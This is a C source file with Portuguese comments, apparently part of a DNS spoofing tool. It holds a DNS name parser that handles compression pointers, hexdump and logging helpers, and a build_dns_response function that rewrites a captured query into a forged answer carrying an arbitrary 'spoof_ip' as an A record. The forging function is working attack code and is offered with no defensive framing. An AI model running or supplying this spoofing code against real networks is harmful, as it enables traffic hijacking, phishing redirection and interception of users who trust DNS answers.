


#include "dns.h"

/*
 * Função: parse_domain
 * ---------------------
 * Extrai um nome de domínio do buffer de um pacote DNS, lidando com a codificação padrão 
 * e com a compressão de nomes baseada em ponteiros.
 *
 * buffer: ponteiro para o pacote DNS completo.
 * buf_len: tamanho total do pacote.
 * offset: posição inicial dentro do buffer para leitura do nome.
 * domain: buffer de saída onde o nome decodificado será armazenado.
 * max_len: tamanho máximo do buffer domain.
 *
 * Retorna: 
 *  - O novo offset após a leitura do nome (se consumido diretamente).
 *  - O offset original incrementado em caso de compressão.
 *  - -1 se houver erro (exemplo: pacote malformado, ponteiro inválido, 
 *    ou loop infinito de ponteiros).
 *
 * Observação: 
 *  - Caso a compressão seja usada, o deslocamento original não é incrementado, pois os 
 *    ponteiros podem estar localizados no final do pacote.
 *  - Para evitar loops infinitos, há um limite máximo de redirecionamentos de ponteiros.
 */

int parse_domain(const unsigned char *buffer, int buf_len, int offset, char *domain, int max_len) {
    int orig_offset = offset;
    int label_len;
    int pos = 0;
    int pointer_count = 0;
    int jumped = 0;

    while (offset < buf_len) {
        label_len = buffer[offset];
        if ((label_len & 0xC0) == 0xC0) {
            if (offset + 1 >= buf_len) {
                fprintf(stderr, "Erro: Pacote malformado ao tentar ler ponteiro de compressão.\n");
                return -1;
            }
            int pointer_offset = ((label_len & 0x3F) << 8) | buffer[offset + 1];
            if (pointer_offset >= buf_len) {
                fprintf(stderr, "Erro: Ponteiro de compressão fora dos limites do pacote.\n");
                return -1;
            }
            if (++pointer_count > MAX_POINTERS) {
                fprintf(stderr, "Erro: Possível loop infinito de ponteiros no nome do domínio.\n");
                return -1;
            }
            if (!jumped) {
                orig_offset = offset + 2;
            }
            offset = pointer_offset;
            jumped = 1;
            continue;
        }
        if (label_len == 0) {
            offset++;
            break;
        }
        if (offset + label_len + 1 >= buf_len || pos + label_len + 1 >= max_len) {
            fprintf(stderr, "Erro: Tamanho do domínio inválido ou fora dos limites.\n");
            return -1;
        }
        if (pos != 0) {
            domain[pos++] = '.';
        }
        memcpy(domain + pos, buffer + offset + 1, label_len);
        pos += label_len;
        domain[pos] = '\0';
        offset += label_len + 1;
    }
    return jumped ? orig_offset : offset;
}

/*
 * Função: build_dns_response
 * ---------------------------
 * Constrói uma resposta DNS baseada na consulta recebida.
 *
 * buffer: buffer contendo o pacote DNS recebido (a resposta será escrita nele).
 * packet_len: tamanho do pacote DNS recebido.
 * spoof_ip: endereço IP (string) a ser retornado na resposta.
 *
 * O funcionamento é dividido em três partes:
 *  1. Modifica o cabeçalho DNS para indicar que é uma resposta.
 *  2. Copia a pergunta original do cliente.
 *  3. Adiciona uma resposta do tipo A com um IP forjado.
 *
 * Retorna: tamanho total da resposta gerada ou -1 em caso de erro.
 */

int build_dns_response(unsigned char *buffer, int packet_len, const char *spoof_ip) {
    if (packet_len < sizeof(DNSHeader)) {
        fprintf(stderr, "Erro: Pacote DNS muito pequeno para ser válido.\n");
        return -1;
    }

    unsigned char *dns_header = buffer;
    dns_header[2] |= 0x80; // Definir resposta
    dns_header[7] = 1; // Uma resposta

    int offset = 12;
    char domain[MAX_DOMAIN_LEN];

    int new_offset = parse_domain(buffer, packet_len, offset, domain, sizeof(domain));
    if (new_offset < 0) {
        return -1;
    }

    if (new_offset + 4 > packet_len) {
        return -1;
    }
    offset = new_offset + 4;

    int ans_offset = offset;
    buffer[ans_offset++] = 0xC0;
    buffer[ans_offset++] = 0x0C;
    buffer[ans_offset++] = 0x00;
    buffer[ans_offset++] = 0x01;
    buffer[ans_offset++] = 0x00;
    buffer[ans_offset++] = 0x01;
    buffer[ans_offset++] = 0x00;
    buffer[ans_offset++] = 0x00;
    buffer[ans_offset++] = 0x00;
    buffer[ans_offset++] = 0x3C;
    buffer[ans_offset++] = 0x00;
    buffer[ans_offset++] = 0x04;

    struct in_addr addr;
    if (inet_aton(spoof_ip, &addr) == 0) {
        fprintf(stderr, "Erro: IP spoof inválido.\n");
        return -1;
    }
    memcpy(&buffer[ans_offset], &addr.s_addr, 4);
    return ans_offset + 4;
}

/*
 * Função: hexdump
 * ---------------------
 * Exibe um bloco de memória em formato hexadecimal. A função é utilizada para mostrar os *blocos em modo raw, permitindo uma análise mais aprofundada.
 *
 * buffer: ponteiro para os dados a serem exibidos.
 * length: número de bytes a serem exibidos.
 *
 * Cada byte é representado como um valor hexadecimal, com 16 bytes por linha.
 */

void hexdump(const unsigned char *buffer, size_t length) {
    for (size_t i = 0; i < length; i++) {
        if (i % 16 == 0) printf("\n");
        printf("%02x ", buffer[i]);
    }
    printf("\n");
}





/*
 * Função: log_query
 * ---------------------
 * Registra uma consulta DNS exibindo o nome de domínio consultado.
 *
 * domain_name: string contendo o nome de domínio da consulta.
 *
 * A função imprime o domínio no formato:
 * "Consulta DNS recebida: <domínio>"
 */

void log_query(const char *domain_name) {
    printf("Consulta DNS recebida: %s\n", domain_name);
}








